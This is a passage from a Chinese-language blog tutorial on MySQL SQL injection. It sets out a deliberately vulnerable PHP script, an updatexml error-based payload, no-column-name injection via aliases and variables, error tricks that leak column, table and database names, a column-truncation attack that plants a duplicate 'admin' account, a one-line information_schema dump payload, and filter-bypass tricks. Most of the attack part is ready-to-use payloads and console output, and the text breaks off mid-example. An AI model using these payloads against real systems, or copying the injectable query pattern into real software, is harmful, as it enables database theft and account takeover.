ACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007581.jpg" alt=""></p><h4 id="表名不完全可控且DESC的表名不含反引号-SELECT的表名含有反引号"><a href="#表名不完全可控且DESC的表名不含反引号-SELECT的表名含有反引号" class="headerlink" title="表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号"></a>表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号</h4><p>test.php 源码如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="hljs-string">"127.0.0.1"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"123456"</span>);</span><br><span class="line">mysql_query(<span class="hljs-string">"use test"</span>);</span><br><span class="line">$table = $_GET[<span class="hljs-string">'table'</span>];</span><br><span class="line">mysql_query(<span class="hljs-string">"desc shop_{$table}"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="hljs-string">"select * from `shop_{$table}` where 1=1"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> $sql;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="hljs-string">"$sql"</span>)));</span><br><span class="line"><span class="hljs-keyword">echo</span> mysql_error();</span><br></pre></td></tr></tbody></table></figure><p></p><p>payload :</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user` where updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5e24</span>,(select user()),<span class="hljs-number">0x5e24</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>`</span><br></pre></td></tr></tbody></table></figure><p></p><p>sql 语句：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">`shop_user`</span> <span class="hljs-keyword">where</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x5e24</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x5e24</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#`` where 1=1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007624.jpg" alt=""></p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from (select 1)a,(select 2)b,(select 3)c;</span><br><span class="line">+<span class="hljs-comment">---+---+---+</span></span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+<span class="hljs-comment">---+---+---+</span></span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+<span class="hljs-comment">---+---+---+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a,(<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b,(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;</span><br><span class="line">+<span class="hljs-comment">---+--------+--------+</span></span><br><span class="line">| 1 | 2      | 3      |</span><br><span class="line">+<span class="hljs-comment">---+--------+--------+</span></span><br><span class="line">| 1 | 2      | 3      |</span><br><span class="line">| 1 | admin  | admin  |</span><br><span class="line">| 2 | hasaki | hasaki |</span><br><span class="line">| 3 | 666    | 2333   |</span><br><span class="line">+<span class="hljs-comment">---+--------+--------+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> e<span class="hljs-number">.3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a,(<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b,(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)e;</span><br><span class="line">+<span class="hljs-comment">--------+</span></span><br><span class="line">| 3      |</span><br><span class="line">+<span class="hljs-comment">--------+</span></span><br><span class="line">| 3      |</span><br><span class="line">| admin  |</span><br><span class="line">| hasaki |</span><br><span class="line">| 2333   |</span><br><span class="line">+<span class="hljs-comment">--------+</span></span><br><span class="line">4 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> e<span class="hljs-number">.3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a,(<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b,(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)e <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">3</span> ;</span><br><span class="line">+<span class="hljs-comment">------+</span></span><br><span class="line">| 3    |</span><br><span class="line">+<span class="hljs-comment">------+</span></span><br><span class="line">| 2333 |</span><br><span class="line">+<span class="hljs-comment">------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">| id | username | passwd |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">|  1 | admin    | admin  |</span><br><span class="line">|  1 | 2        | 3      |</span><br><span class="line">+<span class="hljs-comment">----+----------+--------+</span></span><br><span class="line">2 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="hljs-keyword">test</span>]&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> e<span class="hljs-number">.3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a,(<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b,(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)e <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">3</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;</span><br><span class="line">+<span class="hljs-comment">------+----------+--------+</span></span><br><span class="line">| id   | username | passwd |</span><br><span class="line">+<span class="hljs-comment">------+----------+--------+</span></span><br><span class="line">| 1    | admin    | admin  |</span><br><span class="line">| 2333 | 2        | 3      |</span><br><span class="line">+<span class="hljs-comment">------+----------+--------+</span></span><br><span class="line">2 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.001</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>使用变量需要执行两次<code>sql</code></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user limit 0,1 into @a,@b,@c;</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from user where username='' union select @a,@b,@c;</span><br><span class="line">+<span class="hljs-comment">------+----------+--------+</span></span><br><span class="line">| id   | username | passwd |</span><br><span class="line">+<span class="hljs-comment">------+----------+--------+</span></span><br><span class="line">|    1 | admin    | admin  |</span><br><span class="line">+<span class="hljs-comment">------+----------+--------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.002</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="可报错时爆表名、字段名、库名"><a href="#可报错时爆表名、字段名、库名" class="headerlink" title="可报错时爆表名、字段名、库名"></a>可报错时爆表名、字段名、库名</h3><h4 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h4><p>上文介绍可以使用无列名注入，但是如果再进行限制，不允许使用<code>union</code>该怎么破呢？</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id=1 and (select * from (select * from user as a join user as b) as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name 'id'</span><br></pre></td></tr></tbody></table></figure><p></p><p>把当前表第一个字段成功爆出来了。这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用<code>join</code>把表扩充成两份，在最后别名 c 的时候查询到重复字段，就成功报错。</p><p>同时，可以利用<code>using</code>爆其他字段：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id=1 and (select * from (select * from user as a join user as b using(id)) as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name 'username'</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from user where id=1 and (select * from (select * from user as a join user as b using(id,username)) as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name 'passwd'</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>Mysql 文档中有一个函数：</p><p>Polygon(ls1, ls2, …)</p><p><code>Polygon</code>从多个<code>LineString</code>或<code>WKB LineString</code>参数 构造一个值 。如果任何参数不表示<code>LinearRing</code>（也就是说，不是一个封闭和简单的<code>LineString</code>），返回值就是 NULL</p><p>如果传参不是<code>linestring</code>的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> Polygon(<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon (()<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> ())a)b );</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p>上面的方法已经可以爆出库名了，提供另一个方法</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user where id =1-a();</span><br><span class="line">ERROR 1305 (42000): FUNCTION test.a does not exist</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>首先 mysql 5.5 版本以上需要设置数据库为宽松模式，避免出现插入错误 error</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">set</span> @@sql_mode=ANSI;</span><br></pre></td></tr></tbody></table></figure><p></p><p>首先查看原来的<code>sql_mode</code>，修改一次<code>sql_mode</code></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@sql_mode;</span><br><span class="line">+<span class="hljs-comment">-------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| @@sql_mode                                                                                                                                |</span><br><span class="line">+<span class="hljs-comment">-------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |</span><br><span class="line">+<span class="hljs-comment">-------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="hljs-keyword">set</span> @@sql_mode=ANSI;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@sql_mode;</span><br><span class="line">+<span class="hljs-comment">--------------------------------------------------------------------------------+</span></span><br><span class="line">| @@sql_mode                                                                     |</span><br><span class="line">+<span class="hljs-comment">--------------------------------------------------------------------------------+</span></span><br><span class="line">| REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ONLY_FULL_GROUP_BY,ANSI |</span><br><span class="line">+<span class="hljs-comment">--------------------------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>在宽松模式下创建数据库，并且先插入<code>admin</code>的数据</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users (</span><br><span class="line">    -&gt; username varchar(25),</span><br><span class="line">    -&gt; password varchar(25)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users(username,password) VALUES ('admin', 'rand_pass');</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where username='admin';</span><br><span class="line">+<span class="hljs-comment">----------+-----------+</span></span><br><span class="line">| username | password  |</span><br><span class="line">+<span class="hljs-comment">----------+-----------+</span></span><br><span class="line">| admin    | rand_pass |</span><br><span class="line">+<span class="hljs-comment">----------+-----------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>尝试查询包含有空格的<code>admin</code>数据，发现空格被截断，查到<code>admin</code>的数据</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username = 'admin           ';</span><br><span class="line">+<span class="hljs-comment">----------+-----------+</span></span><br><span class="line">| username | password  |</span><br><span class="line">+<span class="hljs-comment">----------+-----------+</span></span><br><span class="line">| admin    | rand_pass |</span><br><span class="line">+<span class="hljs-comment">----------+-----------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>接着尝试插入<code>admin</code>后面包含有空格的账户，使得前25个字符只包含有<code>admin</code>与空格</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO users(username,password) VALUES ('admin                       1', '123456');</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+<span class="hljs-comment">---------------------------+-----------+</span></span><br><span class="line">| username                  | password  |</span><br><span class="line">+<span class="hljs-comment">---------------------------+-----------+</span></span><br><span class="line">| admin                     | rand_pass |</span><br><span class="line">| admin                     | 123456    |</span><br><span class="line">+<span class="hljs-comment">---------------------------+-----------+</span></span><br><span class="line">2 rows in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">'admin'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> = <span class="hljs-string">'123456'</span>;</span><br><span class="line">+<span class="hljs-comment">---------------------------+----------+</span></span><br><span class="line">| username                  | password |</span><br><span class="line">+<span class="hljs-comment">---------------------------+----------+</span></span><br><span class="line">| admin                     | 123456   |</span><br><span class="line">+<span class="hljs-comment">---------------------------+----------+</span></span><br><span class="line">1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以发现我们成功查找到<code>username=admin</code>的账户，后面不需要为 1 ，只要用空格填充前面的字符直到满足 25 个字符</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'admin                       x'</span>, <span class="hljs-string">'hasaki'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="一次性注入出全部结构"><a href="#一次性注入出全部结构" class="headerlink" title="一次性注入出全部结构"></a>一次性注入出全部结构</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-keyword">SELECT</span> (@) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">SELECT</span> (@) <span class="hljs-keyword">FROM</span> (information_schema.columns) <span class="hljs-keyword">WHERE</span> (table_schema&gt;=@) <span class="hljs-keyword">AND</span> (@)<span class="hljs-keyword">IN</span> (@:=<span class="hljs-keyword">CONCAT</span>(@,<span class="hljs-number">0x0a</span>,<span class="hljs-string">' [ '</span>,table_schema,<span class="hljs-string">' ] &gt;'</span>,table_name,<span class="hljs-string">' &gt; '</span>,column_name))))x)</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果可以回显，可以用这个 payload 一次性全部注入出表结构</p><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="空格替代"><a href="#空格替代" class="headerlink" title="空格替代"></a>空格替代</h3><p></p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">%</span><span class="hljs-number">09</span> <span class="hljs-meta">%</span><span class="hljs-number">0</span>A <span class="hljs-meta">%</span><span class="hljs-number">0</span>B <span class="hljs-meta">%</span><span class="hljs-number">0</span>C <span class="hljs-meta">%</span><span class="hljs-number">0</span>D <span class="hljs-meta">%</span>A<span class="hljs-number">0</span> <span class="hljs-meta">%</span><span class="hljs-number">20</span> <span class="hljs-comment">/**/</span>  <span class="hljs-comment">/*!*/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1'<span class="hljs-comment">/*!Union*/</span><span class="hljs-comment">/*!select*/</span>1,2<span class="hljs-comment">#</span></span><br><span class="line">1'<span class="hljs-comment">/*!Union*/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/*!1,2*/</span><span class="hljs-comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> username() <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2</span>=<span class="hljs-number">2</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="hljs-keyword">select</span>(username())<span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)<span class="hljs-keyword">and</span>(<span class="hljs-number">2</span>=<span 